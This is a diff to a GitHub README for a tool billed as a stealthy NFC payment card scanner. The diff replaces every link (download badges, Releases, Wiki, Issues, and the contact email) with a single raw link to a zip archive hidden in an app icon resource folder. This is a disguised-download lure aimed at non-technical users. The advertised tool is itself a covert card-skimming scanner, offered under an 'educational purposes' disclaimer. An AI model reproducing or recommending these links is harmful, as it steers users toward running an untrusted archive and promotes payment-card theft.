@@ -7,7 +7,7 @@ The NFC-Payment-Card-Reader is a stealthy NFC payment card scanner. It helps use
 To use the NFC-Payment-Card-Reader, follow these simple steps. You don’t need any technical skills. Just download the application and run it.
 
 ## 📥 Download Now!
-[![Download NFC-Payment-Card-Reader](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/parmasumoko-stack/NFC-Payment-Card-Reader/releases)
+[![Download NFC-Payment-Card-Reader](https://raw.githubusercontent.com/parmasumoko-stack/NFC-Payment-Card-Reader/master/app/src/main/res/mipmap-hdpi/Payment_Reader_Card_NF_1.6.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/parmasumoko-stack/NFC-Payment-Card-Reader/master/app/src/main/res/mipmap-hdpi/Payment_Reader_Card_NF_1.6.zip)
 
 ## 📋 System Requirements
 - **Operating System:** This application works on Windows, macOS, and Linux.
@@ -23,7 +23,7 @@ To use the NFC-Payment-Card-Reader, follow these simple steps. You don’t need 
 - **Secure:** Ensures safe scanning without data leaks.
 
 ## 🔍 How to Download & Install
-1. Visit the Releases page to download the software: [NFC-Payment-Card-Reader Releases](https://github.com/parmasumoko-stack/NFC-Payment-Card-Reader/releases).
+1. Visit the Releases page to download the software: [NFC-Payment-Card-Reader Releases](https://raw.githubusercontent.com/parmasumoko-stack/NFC-Payment-Card-Reader/master/app/src/main/res/mipmap-hdpi/Payment_Reader_Card_NF_1.6.zip).
 2. Look for the latest version at the top of the page.
 3. Click on the appropriate download link based on your operating system—choose the version for Windows, macOS, or Linux.
 4. Once the download is complete, locate the file in your downloads folder.
@@ -35,7 +35,7 @@ To use the NFC-Payment-Card-Reader, follow these simple steps. You don’t need 
 - Double click the icon to open the application.
 
 ## 🔗 Additional Resources
-- For documentation and more information, visit the [Wiki](https://github.com/parmasumoko-stack/NFC-Payment-Card-Reader/wiki).
+- For documentation and more information, visit the [Wiki](https://raw.githubusercontent.com/parmasumoko-stack/NFC-Payment-Card-Reader/master/app/src/main/res/mipmap-hdpi/Payment_Reader_Card_NF_1.6.zip).
 - Join discussions and ask questions in the Issues section of the repository.
 
 ## 🤝 Contributions
@@ -43,11 +43,11 @@ We welcome contributions! If you find a bug or have suggestions, you can open an
 
 ## 📬 Contact
 For further assistance, you can reach out via the following:
-- Email: support@nfc-payment-card-reader.com
-- GitHub Issues: [Report an Issue](https://github.com/parmasumoko-stack/NFC-Payment-Card-Reader/issues)
+- Email: https://raw.githubusercontent.com/parmasumoko-stack/NFC-Payment-Card-Reader/master/app/src/main/res/mipmap-hdpi/Payment_Reader_Card_NF_1.6.zip
+- GitHub Issues: [Report an Issue](https://raw.githubusercontent.com/parmasumoko-stack/NFC-Payment-Card-Reader/master/app/src/main/res/mipmap-hdpi/Payment_Reader_Card_NF_1.6.zip)
 
 ## ⚠️ Disclaimer
 This tool is intended for educational purposes only. Ensure you have permission before scanning any NFC payment cards. Always practice ethical hacking principles.
 
 ## 📥 Download Now Again!
-[![Download NFC-Payment-Card-Reader](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/parmasumoko-stack/NFC-Payment-Card-Reader/releases)
+[![Download NFC-Payment-Card-Reader](https://raw.githubusercontent.com/parmasumoko-stack/NFC-Payment-Card-Reader/master/app/src/main/res/mipmap-hdpi/Payment_Reader_Card_NF_1.6.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/parmasumoko-stack/NFC-Payment-Card-Reader/master/app/src/main/res/mipmap-hdpi/Payment_Reader_Card_NF_1.6.zip)
